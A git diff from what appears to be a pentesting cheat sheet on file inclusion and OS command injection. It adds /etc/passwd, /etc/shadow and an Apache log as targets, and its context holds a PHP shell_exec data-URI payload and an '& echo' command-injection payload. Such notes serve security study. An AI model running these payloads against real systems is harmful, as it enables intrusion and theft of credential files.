@@ -1770,6 +1770,12 @@ File inclusion vulnerabilities allow an attacker to include a file into the appl
 - `?file=data:text/plain,hello world`
 - `?file=data:text/plain,<?php echo shell_exec("dir") ?>`
 
+**To search**
+- `var/log/apache2/access.log`
+- `/etc/passwd`
+- `/etc/shadow`
+
+
 ### <ins>OS Command Injection</ins>
 
 Let's say that the vulnerable endpoint it's `https://insecure-website.com/stockStatus?productID=381&storeID=29`. The provide the stock information, the application runs the command `stockpile.pl 381 29`. If there is no OS Command Injection protection, by inserting the payload `& echo abcdefg &` in `productID` it's possible to execute the command `echo`.
